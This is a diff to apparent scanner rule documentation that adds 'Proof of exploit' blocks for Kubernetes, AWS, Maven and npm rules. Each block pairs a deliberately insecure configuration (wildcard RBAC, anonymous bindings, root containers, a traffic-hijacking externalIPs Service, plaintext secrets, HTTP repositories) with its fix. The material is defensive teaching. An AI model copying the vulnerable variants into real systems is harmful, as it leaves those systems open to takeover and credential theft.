+# this Secret YAML to git leaks the credential to
+# every repo reader plus history forever.
+apiVersion: v1
+kind: Secret
+metadata: { name: aws-app, namespace: prod }
+stringData:
+  access_key_id: AKIAIOSFODNN7EXAMPLE
+  secret_access_key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+
+# Safe: source the Secret from an external secrets
+# manager via External Secrets Operator (ESO) — the
+# YAML committed to git references the value by name
+# only; the actual material lives in AWS Secrets
+# Manager / Vault / GSM and rotates there.
+apiVersion: external-secrets.io/v1beta1
+kind: ExternalSecret
+metadata: { name: aws-app, namespace: prod }
+spec:
+  refreshInterval: 1h
+  secretStoreRef: { name: vault-backend, kind: ClusterSecretStore }
+  target: { name: aws-app, creationPolicy: Owner }
+  data:
+    - secretKey: access_key_id
+      remoteRef: { key: prod/aws-app, property: access_key_id }
+    - secretKey: secret_access_key
+      remoteRef: { key: prod/aws-app, property: secret_access_key }
+```
 
 **Source:** [`K8S-018`](../providers/kubernetes.md#k8s-018) in the [Kubernetes provider](../providers/kubernetes.md).
 
@@ -8226,6 +13602,35 @@ roleRef:
 
 **Recommendation.** Replace ``verbs: ["*"]`` and ``resources: ["*"]`` with explicit lists. Wildcards bypass the principle of least privilege: today they grant `read pods` and tomorrow they grant `delete crds` because a new resource was registered in that apiGroup. Explicit verbs (``get``, ``list``, ``watch``) and explicit resources (``configmaps``, ``services``) keep grants stable across cluster upgrades.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a Role / ClusterRole that grants verbs:
+# ["*"] on resources: ["*"]. Equivalent to admin on
+# the scope (namespace for Role, cluster for
+# ClusterRole). Any compromise of a subject bound to
+# this role becomes admin.
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata: { name: do-everything }
+rules:
+  - apiGroups: ["*"]
+    resources: ["*"]
+    verbs: ["*"]
+
+# Safe: enumerate the verbs + resources the workload
+# actually needs. New requirements force a Role review.
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: app-pod-reader
+  namespace: app
+rules:
+  - apiGroups: [""]
+    resources: ["pods", "pods/log"]
+    verbs: ["get", "list", "watch"]
+```
+
 **Source:** [`K8S-021`](../providers/kubernetes.md#k8s-021) in the [Kubernetes provider](../providers/kubernetes.md).
 
 ### `K8S-022`: Service exposes SSH (port 22) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-022 }
@@ -8250,6 +13655,34 @@ roleRef:
 
 - Single-tenant clusters running only operator-managed workloads may apply PSA via an admission webhook instead. The label-based check can't see that.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a namespace with no Pod Security Admission
+# label. Any Pod can land in it with no built-in
+# enforcement against privileged / hostPath / etc.
+# patterns. PSA replaced the deprecated PodSecurityPolicy
+# and is the default cluster-wide gate in Kubernetes
+# 1.25+.
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: app
+  # no pod-security.kubernetes.io/* labels
+
+# Safe: enforce at least the ``baseline`` PSA level
+# (no privileged Pods, no host namespaces, no
+# hostPath). ``restricted`` is stricter and matches
+# the v1.24+ default-deny stance.
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: app
+  labels:
+    pod-security.kubernetes.io/enforce: restricted
+    pod-security.kubernetes.io/enforce-version: latest
+```
+
 **Source:** [`K8S-023`](../providers/kubernetes.md#k8s-023) in the [Kubernetes provider](../providers/kubernetes.md).
 
 ### `K8S-024`: Container missing both livenessProbe and readinessProbe <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-024 }
@@ -8270,6 +13703,46 @@ roleRef:
 
 **Recommendation.** Reserve ``system-cluster-critical`` and ``system-node-critical`` priority classes for control-plane workloads in ``kube-system``. Application pods that adopt them gain the right to evict normal workloads under resource pressure, which is a quiet path to a cluster-wide outage if the application has a bug or the attacker has any control over its spec.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a non-system workload uses
+# ``priorityClassName: system-cluster-critical`` or
+# ``system-node-critical``. Those classes are reserved
+# for kube-system control-plane components; using them
+# on app workloads lets the app preempt critical
+# system Pods under resource pressure and degrade
+# the cluster control plane.
+apiVersion: apps/v1
+kind: Deployment
+metadata: { name: app, namespace: prod }
+spec:
+  template:
+    spec:
+      priorityClassName: system-cluster-critical
+      containers:
+        - name: app
+          image: app@sha256:abc123...
+
+# Safe: use a custom PriorityClass for app workloads
+# that need elevated priority. The class can preempt
+# best-effort workloads but never system Pods.
+apiVersion: scheduling.k8s.io/v1
+kind: PriorityClass
+metadata: { name: app-high }
+value: 100000
+globalDefault: false
+description: "High-priority app workloads"
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata: { name: app, namespace: prod }
+spec:
+  template:
+    spec:
+      priorityClassName: app-high
+```
+
 **Source:** [`K8S-025`](../providers/kubernetes.md#k8s-025) in the [Kubernetes provider](../providers/kubernetes.md).
 
 ### `K8S-026`: LoadBalancer Service has no loadBalancerSourceRanges <span class="pg-sev pg-sev--high">HIGH</span> { #detail-k8s-026 }
@@ -8279,6 +13752,39 @@ roleRef:
 **How this is detected.** Internal-only services should use ``type: ClusterIP`` (and an Ingress for HTTP) or set the cloud-provider-specific internal-LB annotation. ``loadBalancerSourceRanges`` is the Kubernetes-native, cloud-portable way to scope an external LB; cloud-specific firewalls (AWS security groups, GCP firewall rules) are equivalent at the L4 level but invisible to a manifest scanner.
 
 **Recommendation.** Restrict every ``Service`` of ``type: LoadBalancer`` with ``spec.loadBalancerSourceRanges``. The default behavior is to provision an internet-facing load balancer that accepts traffic from 0.0.0.0/0, which exposes whatever the Service fronts to the entire internet. A short list of CIDRs scoped to known clients (office IPs, a NAT gateway, peered VPCs) removes the pre-auth attack surface entirely.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a LoadBalancer Service has no
+# ``loadBalancerSourceRanges``. The cloud provider
+# provisions a LB with a public IP open to 0.0.0.0/0.
+# An internal service that was never meant to be
+# internet-facing (admin UI, debug endpoint, internal
+# API) is exposed.
+apiVersion: v1
+kind: Service
+metadata: { name: app, namespace: prod }
+spec:
+  type: LoadBalancer
+  ports: [{ port: 8080, targetPort: 8080 }]
+  selector: { app: app }
+
+# Safe: declare ``loadBalancerSourceRanges`` with the
+# CIDR allow-list. The cloud provider configures the
+# LB's security group / firewall to drop traffic from
+# anywhere outside the allow-list.
+apiVersion: v1
+kind: Service
+metadata: { name: app, namespace: prod }
+spec:
+  type: LoadBalancer
+  loadBalancerSourceRanges:
+    - 10.0.0.0/8        # internal corporate network
+    - 192.168.0.0/16    # VPN range
+  ports: [{ port: 8080, targetPort: 8080 }]
+  selector: { app: app }
+```
 
 **Source:** [`K8S-026`](../providers/kubernetes.md#k8s-026) in the [Kubernetes provider](../providers/kubernetes.md).
 
@@ -8318,6 +13824,48 @@ roleRef:
 
 - Charts that intentionally re-use the default SA in single-tenant namespaces. Consider creating a named SA anyway. It keeps the audit log unambiguous about which workload made an API call.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a RoleBinding (or ClusterRoleBinding)
+# grants permissions to the ``default`` ServiceAccount
+# in a namespace. Every Pod in that namespace that
+# doesn't override ``serviceAccountName`` runs with
+# the granted permissions — a permission boundary
+# that's invisible from the Pod manifests.
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata: { name: default-can-deploy, namespace: app }
+subjects:
+  - kind: ServiceAccount
+    name: default
+    namespace: app
+roleRef:
+  kind: Role
+  name: deployer
+  apiGroup: rbac.authorization.k8s.io
+
+# Safe: create a dedicated ServiceAccount per workload
+# and bind permissions to it. Each Pod that needs the
+# permission explicitly opts in via
+# ``serviceAccountName: app-deployer``.
+apiVersion: v1
+kind: ServiceAccount
+metadata: { name: app-deployer, namespace: app }
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata: { name: app-deployer-can-deploy, namespace: app }
+subjects:
+  - kind: ServiceAccount
+    name: app-deployer
+    namespace: app
+roleRef:
+  kind: Role
+  name: deployer
+  apiGroup: rbac.authorization.k8s.io
+```
+
 **Source:** [`K8S-029`](../providers/kubernetes.md#k8s-029) in the [Kubernetes provider](../providers/kubernetes.md).
 
 ### `K8S-030`: Workload schedules onto a control-plane node <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-030 }
@@ -8333,6 +13881,41 @@ roleRef:
 **Known false positives.**
 
 - Audit/log shippers and CNI agents in kube-system are exempt by namespace. A workload that legitimately needs to run on the control plane outside kube-system is rare enough to warrant an explicit ``.pipelinecheckignore`` rationale.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a workload has a ``tolerations`` entry
+# for ``node-role.kubernetes.io/control-plane`` AND
+# the matching ``nodeSelector``. The Pod gets
+# scheduled onto the control-plane node, sharing the
+# kernel with kube-apiserver / etcd / kube-controller-
+# manager. A container escape from the app reaches
+# every API request and every Secret in etcd.
+apiVersion: v1
+kind: Pod
+metadata: { name: app }
+spec:
+  nodeSelector:
+    node-role.kubernetes.io/control-plane: ""
+  tolerations:
+    - key: node-role.kubernetes.io/control-plane
+      operator: Exists
+      effect: NoSchedule
+  containers:
+    - name: app
+      image: app@sha256:abc123...
+
+# Safe: workloads schedule onto worker nodes. The
+# control-plane stays isolated.
+apiVersion: v1
+kind: Pod
+metadata: { name: app }
+spec:
+  containers:
+    - name: app
+      image: app@sha256:abc123...
+```
 
 **Source:** [`K8S-030`](../providers/kubernetes.md#k8s-030) in the [Kubernetes provider](../providers/kubernetes.md).
 
@@ -8397,6 +13980,40 @@ roleRef:
 
 **Recommendation.** Set ``securityContext.runAsUser`` to a non-zero UID (e.g. 1000 or any application-specific value) on every workload container. The corresponding ``runAsGroup`` and ``fsGroup`` should also be non-zero. Root inside a container is not isolation, a kernel CVE, a misconfigured mount, or a mis-applied capability collapses straight into the host.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: explicit ``runAsUser: 0`` runs the
+# container as root inside its namespace. Combined
+# with the kernel's user-namespace mapping (or its
+# absence), a container escape lands on the node with
+# UID 0 — same blast radius as if the image had
+# ``USER root``.
+apiVersion: v1
+kind: Pod
+metadata: { name: app }
+spec:
+  containers:
+    - name: app
+      image: app@sha256:abc123...
+      securityContext:
+        runAsUser: 0
+
+# Safe: any non-zero UID. Pair with ``runAsNonRoot:
+# true`` so kubelet refuses to start the container
+# even if the image's ENTRYPOINT later flips UID.
+apiVersion: v1
+kind: Pod
+metadata: { name: app }
+spec:
+  containers:
+    - name: app
+      image: app@sha256:abc123...
+      securityContext:
+        runAsNonRoot: true
+        runAsUser: 10001
+```
+
 **Source:** [`K8S-035`](../providers/kubernetes.md#k8s-035) in the [Kubernetes provider](../providers/kubernetes.md).
 
 ### `K8S-036`: ServiceAccount imagePullSecrets references missing Secret <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-036 }
@@ -8424,6 +14041,44 @@ roleRef:
 **Known false positives.**
 
 - ConfigMaps that legitimately carry placeholder names (``DEBUG_TOKEN_FORMAT``, ``LICENSE_KEY_HEADER``) where the VALUE is a format hint rather than a credential. Rename the key to avoid the credential-shaped name.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a ConfigMap with a credential-shaped
+# value. ConfigMaps are NOT encrypted at rest in etcd
+# (Secrets are, when encryption-at-rest is configured);
+# anyone with ``configmaps/get`` reads the value.
+# ``kubectl get configmap -o yaml`` exposes it; the
+# YAML committed to git leaks it to every repo reader.
+apiVersion: v1
+kind: ConfigMap
+metadata: { name: app-config, namespace: prod }
+data:
+  database_url: postgres://app:hunter2-prod-pw@db.example.com/app
+  api_token: sk_live_abc123def456ghi789
+
+# Safe: store credentials in a Secret (encrypted at
+# rest if encryption-at-rest is enabled). Reference
+# the Secret from the Pod's env via
+# ``valueFrom.secretKeyRef``. The ConfigMap carries
+# only non-secret configuration (feature flags, log
+# levels, etc.).
+apiVersion: v1
+kind: ConfigMap
+metadata: { name: app-config, namespace: prod }
+data:
+  log_level: info
+  feature_flag_x: "true"
+---
+apiVersion: v1
+kind: Secret
+metadata: { name: app-creds, namespace: prod }
+type: Opaque
+stringData:
+  database_url: postgres://app:hunter2-prod-pw@db.example.com/app
+  api_token: sk_live_abc123def456ghi789
+```
 
 **Source:** [`K8S-037`](../providers/kubernetes.md#k8s-037) in the [Kubernetes provider](../providers/kubernetes.md).
 
@@ -8463,6 +14118,37 @@ roleRef:
 
 **Recommendation.** Remove ``securityContext.procMount: Unmasked`` (or set it explicitly to ``Default``). The default ``Default`` procMount type masks several kernel- and node-information paths under ``/proc`` (``/proc/asound``, ``/proc/acpi``, ``/proc/kcore``, ``/proc/keys``, ``/proc/latency_stats``, ``/proc/timer_list``, ``/proc/timer_stats``, ``/proc/sched_debug``, ``/proc/scsi``) and remounts ``/proc/sys`` as read-only. These maskings are what stop a container from reading the host's kernel structures or writing to ``/proc/sys`` and breaking the kernel out of namespace isolation. ``Unmasked`` undoes all of that.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``procMount: Unmasked`` removes the
+# default kernel-managed masks on ``/proc``. The
+# container can read kernel internals
+# (``/proc/kallsyms``, ``/proc/kcore``) and write to
+# ``/proc/sysrq-trigger`` to crash the node.
+apiVersion: v1
+kind: Pod
+metadata: { name: debug-tool }
+spec:
+  containers:
+    - name: app
+      image: app@sha256:abc123...
+      securityContext:
+        procMount: Unmasked
+
+# Safe: default ``procMount: Default`` keeps the
+# masks. Container processes see a sanitized /proc
+# with kernel internals hidden.
+apiVersion: v1
+kind: Pod
+metadata: { name: app }
+spec:
+  containers:
+    - name: app
+      image: app@sha256:abc123...
+      # procMount: Default (implicit)
+```
+
 **Source:** [`K8S-040`](../providers/kubernetes.md#k8s-040) in the [Kubernetes provider](../providers/kubernetes.md).
 
 ### `K8S-041`: Service.externalIPs allows traffic interception (CVE-2020-8554) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-k8s-041 }
@@ -8477,6 +14163,38 @@ roleRef:
 
 - CVE-2020-8554 (Kubernetes, 2020): documented MITM-via-externalIPs design flaw. Kubernetes' upstream advisory recommends restricting externalIPs via admission control.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a Service with ``externalIPs`` lets the
+# Service hijack traffic destined for those IPs on
+# any node in the cluster. CVE-2020-8554: an attacker
+# with ``services/create`` in any namespace creates a
+# Service with ``externalIPs: [10.0.1.5]`` and now
+# intercepts traffic meant for that internal address.
+apiVersion: v1
+kind: Service
+metadata: { name: hijacker, namespace: app }
+spec:
+  type: ClusterIP
+  externalIPs: [10.0.1.5]   # traffic to internal API server
+  ports: [{ port: 443, targetPort: 9999 }]
+  selector: { app: malicious }
+
+# Safe: don't use ``externalIPs`` for routing. Use
+# LoadBalancer or Ingress for external traffic. To
+# defend the cluster, install an admission controller
+# (Kyverno / Gatekeeper) that rejects Services with
+# non-empty ``externalIPs`` from non-system namespaces.
+apiVersion: v1
+kind: Service
+metadata: { name: app, namespace: app }
+spec:
+  type: ClusterIP
+  ports: [{ port: 443, targetPort: 8443 }]
+  selector: { app: app }
+```
+
 **Source:** [`K8S-041`](../providers/kubernetes.md#k8s-041) in the [Kubernetes provider](../providers/kubernetes.md).
 
 ### `K8S-042`: RoleBinding grants access to system:anonymous / system:unauthenticated <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-k8s-042 }
@@ -8486,6 +14204,47 @@ roleRef:
 **How this is detected.** Kubernetes resolves authentication failures into the ``system:anonymous`` user (member of ``system:unauthenticated`` group) rather than rejecting the request outright, so any RBAC subject naming either of those values applies to requests with no Authorization header. The rule fires on both ``RoleBinding`` (namespace-scoped) and ``ClusterRoleBinding`` (cluster-scoped) subjects. Pairs with K8S-020: cluster-admin bound to a named SA is bad; cluster-admin bound to ``system:anonymous`` is cluster takeover by anyone with TCP/443 to the apiserver.
 
 **Recommendation.** Remove the binding's subject entry for ``system:anonymous`` or ``system:unauthenticated``. Anything bound to either subject is reachable without an authentication token, anyone who can hit the apiserver, including from inside an untrusted pod or from the public internet on an exposed apiserver, gets the bound verbs. If the workload genuinely needs unauthenticated read access (rare, usually only for OIDC discovery or the deprecated ``system:public-info-viewer`` shape), audit the bound ClusterRole's verbs+resources and confirm no write or secret-read verb is included.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a RoleBinding grants permissions to
+# ``system:anonymous`` (or the
+# ``system:unauthenticated`` group). Anyone who can
+# reach the API server — including unauthenticated
+# callers from outside the cluster if the API server
+# is exposed — uses these permissions. The Tesla 2018
+# Kubernetes dashboard breach was this shape.
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata: { name: anonymous-can-read }
+subjects:
+  - kind: User
+    name: system:anonymous
+    apiGroup: rbac.authorization.k8s.io
+roleRef:
+  kind: ClusterRole
+  name: view
+  apiGroup: rbac.authorization.k8s.io
+
+# Safe: no RoleBinding ever names ``system:anonymous``
+# or ``system:unauthenticated``. Anonymous auth on
+# the API server should be disabled too
+# (``--anonymous-auth=false`` on kube-apiserver).
+# Authenticated callers get specific identities;
+# bindings reference those identities by name.
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata: { name: dev-team-can-read }
+subjects:
+  - kind: Group
+    name: dev-team@example.com
+    apiGroup: rbac.authorization.k8s.io
+roleRef:
+  kind: ClusterRole
+  name: view
+  apiGroup: rbac.authorization.k8s.io
+```
 
 **Source:** [`K8S-042`](../providers/kubernetes.md#k8s-042) in the [Kubernetes provider](../providers/kubernetes.md).
 
@@ -8531,6 +14290,41 @@ roleRef:
 
 **Recommendation.** Replace ``kms:*`` grants with specific actions needed by the caller (e.g. ``kms:Decrypt``, ``kms:GenerateDataKey``). Key-policy wildcard grants let any holder of the principal re-key, schedule deletion, or export material at will.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a KMS key policy with ``Action: kms:*``
+# (or ``Action: '*'``) on ``Resource: '*'`` granted to
+# an IAM principal. The principal can ScheduleKeyDeletion
+# (effective key destruction in 7 days minimum) and
+# PutKeyPolicy (rewrite the trust on the key itself).
+# A compromise of that principal collapses every secret
+# encrypted with the key.
+{
+  "Effect": "Allow",
+  "Principal": {"AWS": "arn:aws:iam::123:role/CI"},
+  "Action": "kms:*",
+  "Resource": "*"
+}
+
+# Safe: enumerate the verbs the workload actually needs
+# (typically Encrypt / Decrypt / GenerateDataKey for
+# app workloads; CreateGrant if needed). Key-admin verbs
+# (PutKeyPolicy, ScheduleKeyDeletion) stay scoped to a
+# separate, narrowly-bound admin role.
+{
+  "Effect": "Allow",
+  "Principal": {"AWS": "arn:aws:iam::123:role/CI"},
+  "Action": [
+    "kms:Encrypt",
+    "kms:Decrypt",
+    "kms:GenerateDataKey",
+    "kms:DescribeKey"
+  ],
+  "Resource": "*"
+}
+```
+
 **Source:** [`KMS-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `LMB-000`: Lambda API access failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-lmb-000 }
@@ -8551,6 +14345,39 @@ roleRef:
 
 **Recommendation.** Create an AWS Signer profile, reference it from an ``aws_lambda_code_signing_config`` with ``untrusted_artifact_on_deployment = Enforce`` and attach that config to the function. Without one, the Lambda runtime will execute any code that a principal with lambda:UpdateFunctionCode uploads.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a Lambda function with no CodeSigningConfig
+# attached. Anyone with ``lambda:UpdateFunctionCode`` can
+# push arbitrary code without signature verification; a
+# compromised deploy role ships malicious code into
+# production with no signing gate.
+import boto3
+lambdacli = boto3.client('lambda')
+lambdacli.get_function(FunctionName='process-payment')[
+    'Configuration'
+].get('CodeSigningConfigArn')  # -> None
+
+# Safe: create a Signing Profile + CodeSigningConfig
+# and attach it. Only signed code packages (signed via
+# AWS Signer) can be deployed; unsigned uploads are
+# rejected by Lambda.
+signer = boto3.client('signer')
+prof = signer.put_signing_profile(
+    profileName='prod-lambda-signer',
+    platformId='AWSLambda-SHA384-ECDSA',
+)
+csc = lambdacli.create_code_signing_config(
+    AllowedPublishers={'SigningProfileVersionArns': [prof['profileVersionArn']]},
+    CodeSigningPolicies={'UntrustedArtifactOnDeployment': 'Enforce'},
+)
+lambdacli.update_function_configuration(
+    FunctionName='process-payment',
+    CodeSigningConfigArn=csc['CodeSigningConfig']['CodeSigningConfigArn'],
+)
+```
+
 **Source:** [`LMB-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `LMB-002`: Lambda function URL has AuthType=NONE <span class="pg-sev pg-sev--high">HIGH</span> { #detail-lmb-002 }
@@ -8561,6 +14388,34 @@ roleRef:
 
 **Recommendation.** Set the function URL ``auth_type`` to ``AWS_IAM`` and grant ``lambda:InvokeFunctionUrl`` through IAM. ``NONE`` exposes the function to the public internet without authentication.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a Lambda Function URL with
+# ``AuthType: NONE``. The URL is on the public internet
+# and requires no authentication. Anyone who learns the
+# URL can invoke the function (and any downstream
+# service it can reach); functions that read from RDS
+# or write to S3 become a free Internet -> AWS-internal
+# bridge.
+import boto3
+lambdacli = boto3.client('lambda')
+lambdacli.create_function_url_config(
+    FunctionName='process-payment',
+    AuthType='NONE',
+)
+
+# Safe: ``AuthType: AWS_IAM`` requires the caller to
+# sign the request with IAM credentials. The URL is
+# still reachable from the internet, but only IAM
+# principals with ``lambda:InvokeFunctionUrl`` on the
+# function can call it.
+lambdacli.update_function_url_config(
+    FunctionName='process-payment',
+    AuthType='AWS_IAM',
+)
+```
+
 **Source:** [`LMB-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `LMB-003`: Lambda function env vars may contain plaintext secrets <span class="pg-sev pg-sev--high">HIGH</span> { #detail-lmb-003 }
@@ -8570,6 +14425,37 @@ roleRef:
 **How this is detected.** Lambda env vars are world-readable to any principal with ``lambda:GetFunctionConfiguration``, much wider than the principal that can invoke the function. They also persist in CloudFormation drift, change-sets, and CloudTrail events. A secret in a Lambda env var is essentially exposed to anyone with read access to the account.
 
 **Recommendation.** Move secrets out of Lambda environment variables and into Secrets Manager or SSM Parameter Store. Environment variables are visible to anyone with ``lambda:GetFunctionConfiguration`` and persist in CloudTrail events, which keeps the secret in audit logs.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a Lambda function carries credentials in
+# its environment variables in plaintext. The values
+# are visible to anyone with ``lambda:GetFunction``
+# (a wider permission than secrets-manager access),
+# logged into CloudTrail, and lifted into
+# ``UpdateFunctionConfiguration`` events.
+import boto3
+lambdacli = boto3.client('lambda')
+lambdacli.update_function_configuration(
+    FunctionName='process-payment',
+    Environment={'Variables': {
+        'DB_PASSWORD': 'hunter2-prod-pw',
+        'API_KEY': 'sk_live_abc123def456ghi789',
+    }},
+)
+
+# Safe: store credentials in Secrets Manager and fetch
+# them at runtime via the Lambda's role. Env carries
+# only the secret's name / ARN, not the value.
+lambdacli.update_function_configuration(
+    FunctionName='process-payment',
+    Environment={'Variables': {
+        'DB_SECRET_ARN': 'arn:aws:secretsmanager:us-east-1:123:secret:prod/db-AbCdEf',
+        'API_KEY_SECRET_ARN': 'arn:aws:secretsmanager:us-east-1:123:secret:prod/api-Ab2Cd3',
+    }},
+)
+```
 
 **Source:** [`LMB-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -8696,6 +14582,40 @@ Managed entries in ``<dependencyManagement>`` are NOT evaluated by this rule (th
 
 - Maven Central enforced HTTPS-only for the central repository in January 2020; the legacy ``http://repo1.maven.org`` endpoint was retired specifically because of MITM-tampering attacks against downstream consumers. https://blog.sonatype.com/central-repository-moving-to-https
 
+**Proof of exploit.**
+
+```
+<!-- Vulnerable: Maven fetches every dependency tarball
+     and pom from this repository over plaintext HTTP. Any
+     on-path attacker (compromised proxy, malicious VPN
+     exit, internal mirror BGP hijack) substitutes a
+     backdoored jar in flight. Maven's checksum verification
+     only checks against checksums served by the SAME host,
+     so the attacker swaps both the artifact and the
+     adjacent .sha1 file. -->
+<project>
+  <repositories>
+    <repository>
+      <id>internal-mirror</id>
+      <url>http://nexus.internal.example.com/repository/maven-public/</url>
+    </repository>
+  </repositories>
+</project>
+
+<!-- Safe: HTTPS gives TLS for both jar and checksum fetch.
+     For internal Nexus / Artifactory hosts on a private CA,
+     install the CA in the build agent's truststore;
+     never fall back to plaintext HTTP. -->
+<project>
+  <repositories>
+    <repository>
+      <id>internal-mirror</id>
+      <url>https://nexus.internal.example.com/repository/maven-public/</url>
+    </repository>
+  </repositories>
+</project>
+```
+
 **Source:** [`MVN-003`](../providers/maven.md#mvn-003) in the [maven provider](../providers/maven.md).
 
 ### `MVN-004`: pom.xml dependency omits an explicit ``<version>`` <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-mvn-004 }
@@ -8813,6 +14733,43 @@ Managed entries in ``<dependencyManagement>`` are NOT evaluated by this rule (th
 
 - Lockfiles produced by old npm versions (npm < 5) wrote ``sha1-...`` integrity strings that some downstream tools regenerate as missing. The fix is the same in both cases: regenerate with a current npm version against a hash-providing registry.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: ``resolved`` URL is present but ``integrity``
+// is missing. npm has nothing to compare against at install
+// time, so a registry that swaps the tarball mid-flight
+// (cache poisoning, MITM, malicious mirror, account
+// republish) ships arbitrary code without any signal.
+// package-lock.json
+{
+  "lockfileVersion": 3,
+  "packages": {
+    "node_modules/lodash": {
+      "version": "4.17.21",
+      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"
+      // no "integrity" field
+    }
+  }
+}
+
+// Safe: regenerate with ``npm install`` against the default
+// registry. Every fetched-tarball entry carries an SRI
+// ``integrity: sha512-...`` field. npm refuses installs
+// whose tarball bytes don't hash to that value.
+// package-lock.json
+{
+  "lockfileVersion": 3,
+  "packages": {
+    "node_modules/lodash": {
+      "version": "4.17.21",
+      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
+      "integrity": "sha512-v2kDEe57lecTulaDIuNTPy3Ry...AJv8XZ1tvj5FvSg=="
+    }
+  }
+}
+```
+
 **Source:** [`NPM-002`](../providers/npm.md) in the [npm provider](../providers/npm.md).
 
 ### `NPM-003`: package-lock.json entry resolves from a non-registry source <span class="pg-sev pg-sev--high">HIGH</span> { #detail-npm-003 }
@@ -8828,6 +14785,40 @@ Managed entries in ``<dependencyManagement>`` are NOT evaluated by this rule (th
 Standard ``https://registry.npmjs.org`` and other registered registries (GitHub Packages, Verdaccio, internal proxies) pass. A ``git+https://`` URL with a 40-character SHA also passes — that's the documented escape hatch for forks not yet published to a registry. Complements NPM-002 (missing integrity hash); NPM-003 catches the *source* shape, NPM-002 catches the *verification* shape.
 
 **Recommendation.** Move the dependency to a hash-verifiable registry source. If you genuinely need a fork that's not on npm, pin it via ``git+https://host/owner/repo.git#<40-char-sha>`` (exact commit, not a branch or tag) and document the audit trail. ``git+ssh://`` URLs are unreviewable by anyone without access to the same private SSH endpoint; ``http://`` URLs are MITM-able; bare ``file:`` paths bind the build to a developer-machine layout. The default-safe shape is ``https://registry.npmjs.org/...`` with ``integrity: sha512-...``, anything else needs a one-line rationale.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: ``resolved`` URL is git+ssh — a fork pulled
+// from an upstream the team can't audit publicly. The
+// branch ``@main`` is mutable; whoever can push to the
+// upstream ships code into every consumer's build.
+// package-lock.json
+{
+  "packages": {
+    "node_modules/internal-fork": {
+      "version": "1.0.0",
+      "resolved": "git+ssh://git@github.com/myorg/upstream-fork.git#main"
+    }
+  }
+}
+
+// Safe: publish the fork to a registry you control (GitHub
+// Packages, Verdaccio, npm scoped package) and pin via
+// version + integrity. If the upstream truly can't move,
+// pin via ``git+https://...#<40-char-sha>`` so the git
+// object is immutable.
+// package-lock.json
+{
+  "packages": {
+    "node_modules/internal-fork": {
+      "version": "1.0.0",
+      "resolved": "https://npm.pkg.github.com/myorg/internal-fork/-/internal-fork-1.0.0.tgz",
+      "integrity": "sha512-abc123...=="
+    }
+  }
+}
+```
 
 **Source:** [`NPM-003`](../providers/npm.md) in the [npm provider](../providers/npm.md).
 
@@ -8854,6 +14845,41 @@ This rule guards the *package you're publishing*. To stop *consumed* dependencie
 
 - Shai-Hulud npm worm (2026): the postinstall in compromised packages scraped ``GH_TOKEN`` / ``NPM_TOKEN`` / AWS env, used the stolen tokens to publish more compromised packages and push malicious workflow files into victim repos. Removing the install-time script primitive on the *publisher* side is the structural fix.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: every consumer who runs ``npm install`` on
+// this package executes ``setup.js`` with THEIR
+// credentials (``GH_TOKEN``, ``NPM_TOKEN``, AWS env, SSH
+// keys) silently — they didn't opt into anything beyond
+// installing the dependency. This is the Shai-Hulud worm
+// propagation primitive.
+// package.json
+{
+  "name": "my-lib",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node setup.js"
+  }
+}
+
+// Safe: move the work into an explicit script and document
+// the opt-in in the README. Consumers who need it run
+// ``npm run build`` after the install; consumers who don't
+// pay no cost. If you genuinely need native-module
+// compilation, ``node-gyp`` triggers ``install`` from a
+// ``binding.gyp`` without a ``scripts`` entry, so the
+// scripts block can stay empty.
+// package.json
+{
+  "name": "my-lib",
+  "version": "1.0.0",
+  "scripts": {
+    "build": "node setup.js"
+  }
+}
+```
+
 **Source:** [`NPM-004`](../providers/npm.md) in the [npm provider](../providers/npm.md).
 
 ### `NPM-005`: package.json git dependency uses a mutable ref <span class="pg-sev pg-sev--high">HIGH</span> { #detail-npm-005 }
@@ -8870,6 +14896,37 @@ This rule guards the *package you're publishing*. To stop *consumed* dependencie
 Skips entries already routed elsewhere: registry specs (NPM-001), ``file:`` / ``link:`` / ``workspace:`` (NPM-003).
 
